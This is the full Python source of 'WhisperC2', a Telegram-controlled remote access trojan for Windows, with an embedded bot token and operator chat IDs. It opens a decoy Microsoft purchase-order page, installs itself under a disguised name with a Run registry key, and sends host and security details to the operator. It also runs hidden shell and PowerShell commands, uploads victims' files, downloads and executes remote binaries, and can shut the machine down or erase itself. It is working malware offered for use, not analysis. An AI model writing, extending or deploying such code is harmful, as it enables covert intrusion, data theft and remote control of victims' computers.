#!/usr/bin/env python3
# =============================================================================
# WhisperC2 Professional – Final Production Build (Advanced Telemetry)
# =============================================================================
import telebot, platform, subprocess, threading, time, os, sys, atexit, io, traceback, webbrowser
import shutil, winreg, ctypes, requests, json, re
from datetime import datetime
from pathlib import Path
from urllib.parse import urlparse
import random, string

# -----------------------------------------------------------------------------
# Configuration – Zubby’s exact details
# -----------------------------------------------------------------------------
BOT_API_KEY = "8229959913:AAFuLnQB33pstSVbc-g0VgkuVFHHhTh4Qac"
OPERATOR_CHAT_ID = 8269558111
GROUP_CHAT_ID = -1003919074770
DECOY_URL = "https://learn.microsoft.com/en-us/dynamics365/supply-chain/procurement/purchase-order-overview"

# -----------------------------------------------------------------------------
# Early crash logger
# -----------------------------------------------------------------------------
def crash_log(msg):
    try:
        with open(Path(sys.executable).parent / "whisper_error.log", "a") as f:
            f.write(f"[{datetime.now()}] {msg}\n")
    except:
        pass

# -----------------------------------------------------------------------------
# Thread‑safe log buffer
# -----------------------------------------------------------------------------
log_lock = threading.Lock()
log_lines = []

def log(msg: str, level="INFO") -> None:
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with log_lock:
        log_lines.append({"time": timestamp, "level": level, "msg": msg})
    print(f"[{level}] {msg}")

def log_error(msg): log(msg, "ERROR")
def log_success(msg): log(msg, "SUCCESS")
def log_warn(msg): log(msg, "WARN")

# -----------------------------------------------------------------------------
# Telegram bot
# -----------------------------------------------------------------------------
bot = telebot.TeleBot(BOT_API_KEY)

# -----------------------------------------------------------------------------
# Agent identity & persistence
# -----------------------------------------------------------------------------
appdata = os.environ.get('APPDATA', os.path.expanduser('~'))
agents_dir = os.path.join(appdata, 'Microsoft', 'Windows')
os.makedirs(agents_dir, exist_ok=True)

def get_system_id() -> str:
    hostname = subprocess.getstatusoutput("hostname")[1].strip().upper()
    raw_user = subprocess.getstatusoutput("whoami")[1].strip()
    username = raw_user.split('\\', 1)[1] if '\\' in raw_user else raw_user
    return f"{hostname}/{username}"

SYSTEM_ID = get_system_id()
HOSTNAME_PREFIX = SYSTEM_ID.split('/')[0]

TOPIC_ID_FILE = Path(agents_dir) / "topic_id.txt"
PID_FILE = Path(agents_dir) / "agent.pid"

def kill_old_instance():
    if PID_FILE.exists():
        try:
            old_pid = int(PID_FILE.read_text().strip())
            if old_pid == os.getpid():
                return
            handle = ctypes.windll.kernel32.OpenProcess(0x0001, False, old_pid)
            if handle:
                ctypes.windll.kernel32.TerminateProcess(handle, 0)
                ctypes.windll.kernel32.CloseHandle(handle)
                log_success(f"Killed old agent (PID {old_pid})")
                time.sleep(0.5)
        except:
            pass
        try:
            PID_FILE.unlink()
        except:
            pass

def save_pid():
    PID_FILE.write_text(str(os.getpid()))

atexit.register(lambda: PID_FILE.unlink(missing_ok=True) if PID_FILE.exists() else None)

# -----------------------------------------------------------------------------
# Advanced Telemetry – Collect Real System Data
# -----------------------------------------------------------------------------
def get_installed_av():
    try:
        out = subprocess.run(["powershell", "-Command", "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object -ExpandProperty displayName"], capture_output=True, text=True, encoding='utf-8', errors='replace', timeout=10)
        return out.stdout.strip() or "Unknown (possibly Windows Defender)"
    except:
        return "Query failed"

def get_firewall_status():
    try:
        out = subprocess.run(["netsh", "advfirewall", "show", "allprofiles"], capture_output=True, text=True, encoding='utf-8', errors='replace', timeout=10)
        if "State" in out.stdout:
            return out.stdout.splitlines()[0].strip()
        return "Unknown"
    except:
        return "Query failed"

def get_disk_usage():
    drives = []
    try:
        for drive in "CDEFGHIJKLMNOPQRSTUVWXYZ":
            path = Path(f"{drive}:\\")
            if path.exists():
                total = shutil.disk_usage(path).total // (2**30)
                used = shutil.disk_usage(path).used // (2**30)
                free = shutil.disk_usage(path).free // (2**30)
                drives.append(f"{drive}:\\ {total} GB total, {used} GB used, {free} GB free")
        return "\n".join(drives) if drives else "No fixed drives found"
    except:
        return "Query failed"

def get_network_info():
    try:
        out = subprocess.run(["powershell", "-Command", "Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike '*Loopback*'} | Select-Object IPAddress,InterfaceAlias | Format-Table -AutoSize"], capture_output=True, text=True, encoding='utf-8', errors='replace', timeout=10)
        return out.stdout.strip() or "No network adapters"
    except:
        return "Query failed"

def get_running_processes():
    try:
        out = subprocess.run(["powershell", "-Command", "Get-Process | Sort-Object CPU -Descending | Select -First 20 Name,Id,CPU | Format-Table -AutoSize"], capture_output=True, text=True, encoding='utf-8', errors='replace', timeout=10)
        return out.stdout.strip() or "No processes"
    except:
        return "Query failed"

def get_tcp_connections():
    try:
        out = subprocess.run(["netstat", "-an", "-p", "TCP"], capture_output=True, text=True, encoding='utf-8', errors='replace', timeout=10)
        lines = out.stdout.splitlines()
        # show only listening or established connections
        interesting = [l for l in lines if "LISTENING" in l or "ESTABLISHED" in l]
        return "\n".join(interesting[:30]) or "No connections"
    except:
        return "Query failed"

# -----------------------------------------------------------------------------
# HTML5 Telemetry Report (Interactive, Collapsible Sections)
# -----------------------------------------------------------------------------
def generate_telemetry_report(status: str) -> str:
    color = "#4CAF50" if status == "online" else "#F44336"
    emoji = "🟢" if status == "online" else "💀"
    title = f"{SYSTEM_ID} – {status.upper()}"

    # System info
    sys_info = (
        f"<strong>OS:</strong> {platform.system()} {platform.release()} (Build {platform.version()})<br>"
        f"<strong>Architecture:</strong> {platform.machine()}<br>"
        f"<strong>Hostname:</strong> {platform.node()}<br>"
        f"<strong>User:</strong> {os.getlogin()}<br>"
        f"<strong>CPU:</strong> {platform.processor()}<br>"
        f"<strong>RAM:</strong> {psutil.virtual_memory().total // (1024**3)} GB total<br>"
        f"<strong>Boot Time:</strong> {datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S')}<br>"
        f"<strong>Persistence:</strong> {'Installed' if install_persistence() else 'Not installed'}"
    )

    # Security info
    av = get_installed_av()
    fw = get_firewall_status()
    security_info = f"<strong>Antivirus:</strong> {av}<br><strong>Firewall:</strong> {fw}"

    # Build collapsible sections
    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{title}</title>
<style>
    *{{margin:0;padding:0;box-sizing:border-box}}
    body{{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:linear-gradient(135deg,#0d1117,#161b22);color:#c9d1d9;min-height:100vh;display:flex;justify-content:center;align-items:flex-start;padding:2rem}}
    .report-card{{max-width:1000px;width:100%;background:#161b22;border:1px solid #30363d;border-radius:16px;overflow:hidden;box-shadow:0 20px 40px rgba(0,0,0,0.5);margin:0 auto}}
    .header{{background:{color};padding:2rem;text-align:center}}
    .header h1{{font-size:2rem;font-weight:600;color:white;margin-bottom:.25rem}}
    .header .agent{{font-size:1rem;opacity:.9;color:white;font-family:monospace}}
    .body{{padding:1.5rem}}
    .section{{margin-bottom:1.5rem;border:1px solid #30363d;border-radius:8px;overflow:hidden}}
    .section-title{{background:#0d1117;padding:0.75rem 1rem;font-weight:600;color:#58a6ff;cursor:pointer;display:flex;justify-content:space-between;align-items:center}}
    .section-title::after{{content:'▼';font-size:0.8rem;transition:transform 0.2s}}
    .section-title.collapsed::after{{transform:rotate(-90deg)}}
    .section-content{{padding:1rem;display:block}}
    .section-content.hidden{{display:none}}
    table{{width:100%;border-collapse:collapse}}
    th,td{{padding:0.5rem 0.75rem;border-bottom:1px solid #21262d;text-align:left;font-size:0.9rem}}
    th{{background:#0d1117;color:#8b949e;font-weight:600}}
    tr:hover td{{background:#1c2128}}
    .log-level{{font-weight:bold;padding:0.1em 0.5em;border-radius:4px;font-size:0.8rem}}
    .log-INFO{{color:#58a6ff}}
    .log-SUCCESS{{color:#3fb950}}
    .log-WARN{{color:#d29922}}
    .log-ERROR{{color:#f85149}}
    pre{{white-space:pre-wrap;font-family:monospace;font-size:0.85rem;background:#0d1117;padding:0.5rem;border-radius:4px;margin:0.5rem 0}}
</style>
</head>
<body>
<div class="report-card">
    <div class="header">
        <h1>{emoji} {title}</h1>
        <div class="agent">{SYSTEM_ID}</div>
    </div>
    <div class="body">

        <!-- System Information -->
        <div class="section">
            <div class="section-title" onclick="toggleSection(this)">🖥️ System Information</div>
            <div class="section-content">{sys_info}</div>
        </div>

        <!-- Security -->
        <div class="section">
            <div class="section-title" onclick="toggleSection(this)">🛡️ Security Status</div>
            <div class="section-content">{security_info}</div>
        </div>

        <!-- Disk Usage -->
        <div class="section">
            <div class="section-title" onclick="toggleSection(this)">💾 Disk Usage</div>
            <div class="section-content"><pre>{get_disk_usage()}</pre></div>
        </div>

        <!-- Network Info -->
        <div class="section">
            <div class="section-title" onclick="toggleSection(this)">🌐 Network Configuration</div>
            <div class="section-content"><pre>{get_network_info()}</pre></div>
        </div>

        <!-- Processes -->
        <div class="section">
            <div class="section-title" onclick="toggleSection(this)">📊 Running Processes (Top 20)</div>
            <div class="section-content"><pre>{get_running_processes()}</pre></div>
        </div>

        <!-- TCP Connections -->
        <div class="section">
            <div class="section-title" onclick="toggleSection(this)">🔗 Active TCP Connections</div>
            <div class="section-content"><pre>{get_tcp_connections()}</pre></div>
        </div>

        <!-- Agent Log -->
        <div class="section">
            <div class="section-title" onclick="toggleSection(this)">📝 Agent Startup Log</div>
            <div class="section-content">
                <table>
                    <thead><tr><th>Timestamp</th><th>Level</th><th>Message</th></tr></thead>
                    <tbody>
                        {''.join(f'<tr><td>{entry["time"]}</td><td><span class="log-level log-{entry["level"]}">{entry["level"]}</span></td><td>{entry["msg"]}</td></tr>' for entry in log_lines)}
                    </tbody>
                </table>
            </div>
        </div>
    </div>
</div>
<script>
    function toggleSection(title) {{
        const content = title.nextElementSibling;
        content.classList.toggle('hidden');
        title.classList.toggle('collapsed');
    }}
    // All sections expanded by default
</script>
</body>
</html>"""
    return html

def send_telemetry(topic_id, status: str) -> bool:
    html_content = generate_telemetry_report(status)
    bio = io.BytesIO(html_content.encode('utf-8'))
    bio.name = f"{SYSTEM_ID}_{status}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
    # Try topic first, then group, then plain text fallback
    for dest, tid in [("topic", topic_id), ("group", None)]:
        if tid is None and dest == "topic":
            continue
        try:
            bot.send_document(GROUP_CHAT_ID, bio, message_thread_id=tid)
            log_success(f"Telemetry HTML sent via {dest} ({status})")
            return True
        except Exception as e:
            log_error(f"Telemetry {dest} send failed: {e}")
    plain = f"{'🟢' if status=='online' else '💀'} **{SYSTEM_ID}** {status}\n```\n" + "\n".join([f"[{x['level']}] {x['msg']}" for x in log_lines[-10:]]) + "\n```"
    try:
        bot.send_message(GROUP_CHAT_ID, plain, parse_mode='Markdown')
        log_success(f"Telemetry plain text sent ({status})")
        return True
    except:
        return False

# -----------------------------------------------------------------------------
# Topic management
# -----------------------------------------------------------------------------
def load_topic_id() -> int | None:
    if TOPIC_ID_FILE.exists():
        try:
            return int(TOPIC_ID_FILE.read_text().strip())
        except:
            pass
    return None

def save_topic_id(tid: int) -> None:
    TOPIC_ID_FILE.write_text(str(tid))

def get_or_create_topic() -> int | None:
    existing = load_topic_id()
    if existing:
        try:
            test = bot.send_message(GROUP_CHAT_ID, "🔍", message_thread_id=existing)
            bot.delete_message(GROUP_CHAT_ID, test.message_id)
            log_success(f"Reusing topic {existing}")
            return existing
        except:
            log_error("Stored topic not found – will create a new one")
    try:
        new_topic = bot.create_forum_topic(GROUP_CHAT_ID, SYSTEM_ID, icon_color=0x6FB9F0)
        tid = new_topic.message_thread_id
        save_topic_id(tid)
        log_success(f"Created topic {tid}")
        return tid
    except Exception as e:
        log_error(f"Topic creation failed: {e}")
        return None

def install_persistence() -> bool:
    if not getattr(sys, 'frozen', False):
        log("Persistence skipped – script mode")
        return False
    try:
        dest_path = Path(agents_dir) / 'SystemSettingsBroker.exe'
        current = Path(sys.executable if getattr(sys, 'frozen', False) else __file__)

        if current.resolve() == dest_path.resolve():
            return True

        if not dest_path.exists():
            try:
                shutil.copy2(current, dest_path)
            except PermissionError:
                log_error("Copy failed – persistence NOT set")
                return False
            except Exception as e:
                log_error(f"Copy error: {e}")
                return False

        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r'Software\Microsoft\Windows\CurrentVersion\Run',
                            0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, 'System Settings Broker', 0, winreg.REG_SZ, str(dest_path))
        log_success("Persistence installed")
        return True
    except Exception as e:
        log_error(f"Persistence error: {traceback.format_exc()}")
        return False

def self_destruct(topic_id) -> None:
    log("Self‑destruct sequence started")
    send_telemetry(topic_id, "offline")
    try:
        persistent = Path(agents_dir) / 'SystemSettingsBroker.exe'
        if persistent.exists():
            persistent.unlink()
            log_success("Persistent file deleted")
        else:
            log("Persistent file already absent")
    except Exception as e:
        log_error(f"Failed to delete persistent file: {e}")
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r'Software\Microsoft\Windows\CurrentVersion\Run',
                            0, winreg.KEY_SET_VALUE) as key:
            try:
                winreg.DeleteValue(key, 'System Settings Broker')
                log_success("Registry key removed")
            except FileNotFoundError:
                log("Registry key already absent")
    except Exception as e:
        log_error(f"Registry cleanup error: {e}")
    try:
        current = Path(sys.executable) if getattr(sys, 'frozen', False) else Path(__file__)
        if current.exists():
            ctypes.windll.kernel32.MoveFileExW(str(current), None, 0x4)
            log_success("Self‑deletion scheduled")
    except Exception as e:
        log_error(f"Self‑delete scheduling error: {e}")

# -----------------------------------------------------------------------------
# Command helpers
# -----------------------------------------------------------------------------
def sys_cmd(cmd: str) -> str:
    try:
        proc = subprocess.run(["cmd.exe", "/c", cmd], capture_output=True, text=True, encoding='utf-8', errors='replace', creationflags=0x08000000, timeout=30)
        out = (proc.stdout + proc.stderr).strip() or "[No output]"
        return out[:4000]
    except subprocess.TimeoutExpired:
        return "Timed out"
    except Exception as e:
        return f"Error: {e}"

def ps_cmd(cmd: str) -> str:
    try:
        proc = subprocess.run(["powershell", "-Command", cmd], capture_output=True, text=True, encoding='utf-8', errors='replace', creationflags=0x08000000, timeout=30)
        out = (proc.stdout + proc.stderr).strip() or "[No output]"
        return out[:4000]
    except subprocess.TimeoutExpired:
        return "Timed out"
    except Exception as e:
        return f"Error: {e}"

def view_file(path: str) -> str:
    try:
        if not os.path.exists(path): return "Not found"
        if os.path.isdir(path): return "Is a directory"
        if os.path.getsize(path) > 10*1024*1024: return "Too large"
        with open(path, 'r', errors='ignore') as f:
            return f.read()[:4000]
    except Exception as e:
        return f"Error: {e}"

def download_file_fs(path: str):
    try:
        if not os.path.exists(path): return None, "Not found"
        if os.path.isdir(path): return None, "Is a directory"
        if os.path.getsize(path) > 50*1024*1024: return None, "Too large"
        return path, None
    except:
        return None, "Error"

def dex(arg_line: str):
    if not arg_line: return "Usage: dex <url> [args...]"
    parts = arg_line.split(maxsplit=1)
    url = parts[0]
    extra = parts[1].split() if len(parts) > 1 else []
    p = urlparse(url)
    if p.scheme not in ('http','https'): return "Invalid scheme"
    ext = os.path.splitext(p.path)[1] or ".exe"
    name = ''.join(random.choices(string.ascii_letters+string.digits, k=8)) + ext
    dest = os.path.join(os.environ.get('TEMP','.'), name)
    try:
        r = requests.get(url, stream=True, timeout=30)
        r.raise_for_status()
        with open(dest, 'wb') as f:
            for c in r.iter_content(8192):
                if c: f.write(c)
        log_success(f"Downloaded {os.path.getsize(dest)} bytes")
    except Exception as e:
        log_error(f"Download failed: {e}")
        return f"Download failed: {e}"
    try:
        proc = subprocess.Popen([dest, *extra], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, creationflags=0x08000000)
        out, err = proc.communicate(timeout=30)
        output = (out + err).strip() or "[No output]"
        log_success(f"DEX exit {proc.returncode}")
        return f"Executed: {dest}\nExit: {proc.returncode}\n{output}"
    except Exception as e:
        log_error(f"DEX error: {e}")
        return f"Execution error: {e}"
    finally:
        try: ctypes.windll.kernel32.MoveFileExW(dest, None, 0x4)
        except: pass

def execute_command(cmd_line: str, topic_id):
    parts = cmd_line.strip().split(' ', 1)
    cmd = parts[0].lower()
    args = parts[1] if len(parts) > 1 else ""

    if cmd in ("ping","start","scan"):
        return f"🟢 {SYSTEM_ID} online\n{platform.system()} {platform.release()}", None
    elif cmd == "shell":
        if not args: return "Usage: shell <command>", None
        return sys_cmd(args).replace('```',"'''"), None
    elif cmd in ("powershell","pow"):
        if not args: return "Usage: powershell <command>", None
        return ps_cmd(args).replace('```',"'''"), None
    elif cmd in ("download","downloadfile"):
        path, err = download_file_fs(args.strip())
        if err: return err, None
        return f"⬆️ Uploading {args.strip()}", path
    elif cmd == "delete":
        try: os.remove(args.strip()); return f"🗑️ Deleted: {args.strip()}", None
        except Exception as e: return f"❌ Delete failed: {e}", None
    elif cmd in ("view","viewfile"): return view_file(args.strip()).replace('```',"'''"), None
    elif cmd == "dex": return dex(args).replace('```',"'''"), None
    elif cmd == "die":
        self_destruct(topic_id)
        return "💀 Shutting down...", None
    elif cmd == "off":
        subprocess.run(["shutdown","/s","/t","0","/f"], check=False)
        return "🔌 Shutting down PC...", None
    else:
        return f"❓ Unknown: {cmd}", None

# -----------------------------------------------------------------------------
# Main
# -----------------------------------------------------------------------------
def main():
    try:
        log("Agent starting")
        kill_old_instance()
        save_pid()
        install_persistence()

        topic_id = None
        for attempt in range(3):
            topic_id = get_or_create_topic()
            if topic_id: break
            log_error(f"Topic attempt {attempt+1} failed, retrying…")
            time.sleep(2)

        if not topic_id:
            log_error("All topic attempts failed – falling back to main group")
            topic_id = None
            bot.send_message(GROUP_CHAT_ID, f"⚠️ **{SYSTEM_ID}** running in main group mode – commands must include `{HOSTNAME_PREFIX}`")

        log(f"Operational: topic_id={topic_id}, persistence={install_persistence()}")

        def _handler_wrapper(message):
            if message.from_user.id != OPERATOR_CHAT_ID or message.from_user.is_bot:
                return
            if topic_id is not None:
                if getattr(message, 'message_thread_id', None) != topic_id:
                    return
            else:
                if not message.text or HOSTNAME_PREFIX not in message.text:
                    return
            text = (message.text or "").strip()
            if not text: return
            if text.startswith('/'): text = text[1:]
            response, file_path = execute_command(text, topic_id)
            reply_kwargs = {'message_thread_id': topic_id} if topic_id else {}
            if text.lower().startswith("die"):
                bot.reply_to(message, f"```\n{response}\n```", parse_mode='Markdown', **reply_kwargs)
                sys.exit(0)
            try:
                bot.reply_to(message, f"```\n{response}\n```", parse_mode='Markdown', **reply_kwargs)
            except:
                bot.reply_to(message, response, **reply_kwargs)
            if file_path and os.path.exists(file_path):
                try:
                    with open(file_path, 'rb') as f:
                        bot.send_document(message.chat.id, f, message_thread_id=topic_id)
                    log_success(f"File sent: {file_path}")
                except Exception as e:
                    log_error(f"File send error: {e}")
                finally:
                    try: os.remove(file_path)
                    except: pass

        @bot.message_handler(chat_types=['supergroup'], func=lambda m: bool(m.text))
        def _handler(msg):
            _handler_wrapper(msg)

        threading.Thread(target=webbrowser.open, args=(DECOY_URL,), daemon=True).start()
        send_telemetry(topic_id, "online")
        log("Entering polling loop")
        bot.infinity_polling(timeout=30, long_polling_timeout=30)

    except Exception as fatal:
        crash_log(traceback.format_exc())
        log_error(f"Fatal crash: {fatal}")
        try:
            bot.send_message(GROUP_CHAT_ID, f"🔥 **{SYSTEM_ID}** crashed:\n```{traceback.format_exc()}```")
        except:
            pass

if __name__ == "__main__":
    main()
